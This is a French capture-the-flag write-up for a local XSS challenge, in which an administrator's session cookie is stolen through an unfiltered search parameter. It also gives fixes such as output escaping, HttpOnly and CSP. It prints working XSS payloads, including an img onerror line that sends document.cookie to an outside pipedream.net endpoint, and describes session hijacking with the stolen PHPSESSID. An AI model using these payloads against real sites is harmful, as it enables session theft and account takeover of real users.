# Voler le Cookie Admin - XSS Challenge

## 🎯 Objectif

Se connecter à l'application web en volant le cookie de l'administrateur qui visite les pages via une vulnérabilité XSS.

## 🔍 Découverte

En explorant l'application, nous trouvons une page de recherche avec un paramètre `search` dans l'URL qui semble ne pas être correctement filtré :
```
http://localhost:8000/index.php?search=[INPUT]
```

## 💉 Exploitation

### Première tentative - Test XSS basique
Test de la vulnérabilité avec une simple alerte :
```javascript
http://localhost:8000/index.php?search=<script>alert(1)</script>
```
➜ Succès ! L'alerte s'affiche, confirmant la vulnérabilité XSS.

### Test d'accès aux cookies
Vérifions l'accès aux cookies :
```javascript
http://localhost:8000/index.php?search=<script>alert(document.cookie)</script>
```
➜ Les cookies sont accessibles !

### Solution finale
1. Création d'un endpoint sur RequestBin pour capturer les cookies :
   ```
   https://eoxozs6d4ekomy9.m.pipedream.net/
   ```

2. Construction du payload XSS pour rediriger avec le cookie :
   ```javascript
   <img src=x onerror=window.location='https://eoxozs6d4ekomy9.m.pipedream.net/?cookie='+document.cookie>
   ```

3. URL finale avec le payload (non encodée) :
   ```
   http://localhost:8000/index.php?search=<img src=x onerror=window.location='https://eoxozs6d4ekomy9.m.pipedream.net/?cookie='+document.cookie>
   ```

4. Envoi de l'URL via la page de contact pour que l'administrateur la visite
5. Récupération du cookie admin dans RequestBin
6. Remplacement de notre PHPSESSID par celui de l'admin

## 🎉 Flag
Flag obtenu après avoir remplacé le cookie par celui de l'administrateur !

## 📝 Notes
- La vulnérabilité XSS est présente car les entrées utilisateur ne sont pas correctement filtrées
- L'utilisation de RequestBin simplifie grandement la capture des cookies
- Les cookies de session ne sont pas protégés par le flag HttpOnly

## 🔒 Correction
Pour sécuriser ce type de vulnérabilité :
- Echapper correctement toutes les entrées utilisateur
- Implémenter le flag HttpOnly sur les cookies sensibles
- Utiliser des en-têtes de sécurité comme Content-Security-Policy
- Valider et filtrer les paramètres d'entrée côté serveur
